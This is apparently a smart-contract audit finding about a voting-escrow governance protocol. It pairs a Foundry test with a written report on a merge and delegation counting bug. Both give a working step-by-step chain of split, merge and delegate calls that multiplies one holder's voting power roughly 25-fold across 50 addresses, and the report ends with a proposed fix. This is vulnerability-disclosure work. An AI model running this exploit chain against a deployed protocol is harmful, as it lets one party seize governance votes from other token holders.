[H-02]: Merge-Induced Delegation Manipulation Leading to Unlimited Voting Power Amplification and DoS

MergeInducedDelegationExploit.t.sol

```sol
// test/v1_3_0/integration/exploits/MergeInducedDelegationExploit.t.sol
pragma solidity ^0.8.17;

import { IGaugeVote } from "../../versions.sol";

import { EscrowBase } from "../../base/EscrowBase.sol";
import "forge-std/console.sol";

contract TestMergeInducedDelegationExploit is EscrowBase {
  address tokenOwner = address(this);

  address gauge = address(0x777);

  address alice = address(1);

  uint256 N = 50;
  address[] delegates;

  uint256[] tokenIds = new uint256[](2);

  uint256 Lock_Amount = 10e18;
  uint256 constant MIN_DEPOSIT = 1e18;

  function setUp() public override {
    super.setUp();

    super.mintAndApproveEscrow();

    token.mint(alice, Lock_Amount * 2);

    vm.prank(alice);
    token.approve(address(escrow), Lock_Amount * 2);

    // alice nft 1
    vm.prank(alice);
    tokenIds[0] = escrow.createLock(Lock_Amount);

    // alice nft 2
    vm.prank(alice);
    tokenIds[1] = escrow.createLock(Lock_Amount);

    nftLock.enableTransfers();

    escrow.enableSplit();

    escrow.setMinDeposit(MIN_DEPOSIT);

    voter.createGauge(gauge, "metadata");
  }

  function test_Merge_Induced_Delegation_Exploit() public {
    vm.prank(address(alice));
    ivotesAdapter.delegate(address(alice));

    uint256 preExploitPower = ivotesAdapter.getVotes(alice);
    console.log("Initial power:", preExploitPower);

    vm.prank(address(alice));
    ivotesAdapter.undelegate(tokenIds);

    delegates = new address[](N);
    for (uint i = 0; i < N; i++) {
      delegates[i] = address(uint160(100 + i));
    }

    // initial phantom for delegates[0]
    vm.prank(alice);
    ivotesAdapter.setDelegateAddress(delegates[0]);

    uint256[] memory tokenIdsToDelegate = new uint256[](1);
    tokenIdsToDelegate[0] = tokenIds[0];

    vm.prank(alice);
    ivotesAdapter.delegate(tokenIdsToDelegate);

    vm.prank(alice);
    escrow.merge(tokenIds[0], tokenIds[1]);

    uint256 mainId = tokenIds[1];

    // then cycles for phantoms 1 to N-2
    for (uint i = 1; i < N - 1; i++) {
      vm.prank(alice);
      ivotesAdapter.setDelegateAddress(delegates[i]);

      vm.prank(alice);
      ivotesAdapter.delegate(delegates[i]); // bypass

      vm.prank(alice);
      uint256 newId = escrow.split(mainId, Lock_Amount);

      uint256[] memory tokenIdsToUndelegate = new uint256[](1);
      tokenIdsToUndelegate[0] = newId;
      vm.prank(alice);
      ivotesAdapter.undelegate(tokenIdsToUndelegate);

      vm.prank(alice);
      escrow.merge(mainId, newId);

      mainId = newId;
    }

    // final delegate to delegates[N-1]
    vm.prank(alice);
    ivotesAdapter.setDelegateAddress(delegates[N - 1]);

    uint256[] memory tokenIdsToDelegateFinal = new uint256[](1);
    tokenIdsToDelegateFinal[0] = mainId;
    vm.prank(alice);
    ivotesAdapter.delegate(tokenIdsToDelegateFinal);

    // log total VP
    uint256 totalVP = 0;
    for (uint i = 0; i < N; i++) {
      uint256 vp = ivotesAdapter.getVotes(delegates[i]);
      console.log("Delegate %s VP: %s", i, vp);
      totalVP += vp;
    }
    console.log("Total VP (post-exploit): %s", totalVP);

    // amplification factor
    uint256 amplificationFactor = totalVP / preExploitPower;
    console.log("Amplification factor: %s", amplificationFactor);
  }
}
```

MergeInducedDelegationManipulation.md

# [H-02]: Merge-Induced Delegation Manipulation Leading to Unlimited Voting Power Amplification and DoS

### Severity

High - This vulnerability allows arbitrary inflation of voting power. The amplification is unbounded (e.g., 25x demonstrated with N=50, scalable to 500x+ with more cycles), combined with DoS issues on token delegation/undelegation due to underflow and state desync.

### Affected Versions

- v1_3_0 (impacts `VotingEscrowIncreasing_v1_2_0.sol` and `EscrowIVotesAdapter.sol` interactions)
- Potentially earlier versions with similar merge/delegation logic (e.g., v1_2_0 if splits enabled)

## Description

This exploit targets a critical vulnerability in the interaction between the `merge` function in `VotingEscrowIncreasing_v1_2_0.sol` (used in v1_3_0 flows) and the delegation tracking in `EscrowIVotesAdapter.sol`. By merging a delegated veNFT with an undelegated one, the system incorrectly decrements `numberOfDelegatedTokens[owner]` without verifying if the merged-from token was delegated, leading to an undercount (e.g., from 1 to 0 despite the merged-to token remaining delegated). This poisoned state bypasses safeguards in `setDelegateAddress` (which checks for zero delegated tokens), allowing repeated changes to the delegatee even when tokens are effectively delegated.

Combined with split operations, attackers can chain this to create "phantom" delegations: Each cycle delegates the merged token's voting power (VP) to a new delegatee without subtracting from previous ones, duplicating VP across multiple checkpoints. The VP sticks in old delegatees accounts because undelegation only affects the new split token, not the main one, and checkpoints aren't properly updated/subtracted for phantoms. This enables unlimited amplification—e.g., from two 10e18 locks (initial VP ~20e18), an attacker can generate 510e18 total VP across 50 delegatees (25x factor), scalable to arbitrary N by increasing cycles.

The root cause is in `moveDelegateVotes` (line ~300 in `EscrowIVotesAdapter.sol`), which decrements the count if `fromDelegatee != address(0)` even for undelegated tokens (no `tokenIsDelegated(_tokenId)` check), and skips bias/slope subtraction for zero-locked merges. This desyncs the count from the bitmap/delegation state, enabling bypasses and phantom VP without proper checkpoint subtraction. The exploit is non-reentrant, has no out-of-gas (OOG) dependency, and persists across epochs if votes are cast before resets.

## Impact

- **Unlimited Voting Power Amplification**: Scalable to arbitrary factor (e.g., 25x with N=50, higher with larger N/cycles). From 20e18 base, generate 510e18+ VP to dominate governance.
- **DoS**: Poisoned count can prevent normal delegation/undelegation.

## Proof of Concept

A coded PoC is available in the repository (test/v1_3_0/integration/exploits/MergeInducedDelegationExploit.t.sol) and in the gist.

### Step 0: Initial Setup (Create Delegated and Undelegated NFTs)

- Enable transfers and splits: `nftLock.enableTransfers(); escrow.enableSplit(); escrow.setMinDeposit(1e18)`.
- Mint and approve tokens: `token.mint(Alice, 20e18); token.approve(escrow, 20e18)`.
- Create two locks: `escrow.createLock(10e18)` → tokenId1 (undelegated), `escrow.createLock(10e18)` → tokenId2 (to be delegated).
- Delegate tokenId1 to initial delegatee (e.g., delegates[0]):
  - `ivotesAdapter.setDelegateAddress(delegates[0]);`
  - `ivotesAdapter.delegate([tokenId1]);`.
  - Internal: `_delegate` computes bias/slope ≈15e18/10e18, checkpoints to delegates[0], sets bitmap true for tokenId1, `numberOfDelegatedTokens[Alice]=1`.

### Step 1: Trigger the Bug (Merge to Poison Count)

- Merge undelegated tokenId2 into delegated tokenId1: `escrow.merge(tokenId2, tokenId1)`.
  - Escrow calls `ivotesAdapter.moveDelegateVotes(Alice, address(0), tokenId2, LockedBalance(0,0))` (zero-locked for from-token).
  - In `moveDelegateVotes`:
    - fromDelegatee = delegates[0] (!=0), toDelegatee=0.
    - locked.amount==0 → Skips bias/slope subtraction from delegates[0]'s checkpoint.
    - Decrements `numberOfDelegatedTokens[Alice]--` (1→0)—**bug** (tokenId2 wasn't delegated, no `tokenIsDelegated` check).
  - State: `numberOfDelegatedTokens[Alice]=0` (false, tokenId1 still delegated via bitmap), stuck VP in delegates[0]'s account

### Step 2: Chain Split-Merge to Amplify (Repeat for N-1 Cycles)

- For each cycle i=1 to N-2 (e.g., 48 cycles for N=50):
  - Bypass setDelegateAddress to new delegatee (delegates[i]): `ivotesAdapter.setDelegateAddress(delegates[i])`.
    - Check `if(numberOfDelegatedTokens[Alice] !=0) revert` passes (count=0).
  - Execute delegate (no tokenIds, uses IVotes `delegate(address)`): `ivotesAdapter.delegate(delegates[i])`.
    - Since count=0, it skips undelegation of existing (phantom) delegations.
    - Delegates all owned tokens (tokenId1, VP~30e18) to delegates[i], adding to new checkpoint without subtracting from previous.
  - Split off a new token: `uint256 newId = escrow.split(tokenId1, 10e18)`.
    - Creates newId with 10e18, tokenId1 retains 10e18.
  - Undelegate only newId: `ivotesAdapter.undelegate([newId])`.
  - Merge back: `escrow.merge(tokenId1, newId)`.
    - Poisons count again (decrements to 0)
    - Updates tokenId1 to 20e18 VP again.
- State per cycle: New delegatee gets stuck VP (phantom, not subtracted on undelegate).

### Step 3: Final Delegation and Vote

- Set final delegatee (delegates[N-1]): `ivotesAdapter.setDelegateAddress(delegates[N-1])`.
- Delegate explicitly: `ivotesAdapter.delegate([tokenId1])`
- Total VP: Sum across all N delegatees.
- Vote with each delegatee in gauges: `voter.vote(gauge, weight)` using amplified VP.

### Tools Used

Cursor, Foundry, Manual code review.

## Mitigation Recommendations

In `moveDelegateVotes`: Add `if (tokenIsDelegated(_tokenId)) { numberOfDelegatedTokens[_from]--; ... }` before decrement.

Note: This is a preliminary assessment requiring thorough validation. Additional edge cases may emerge.
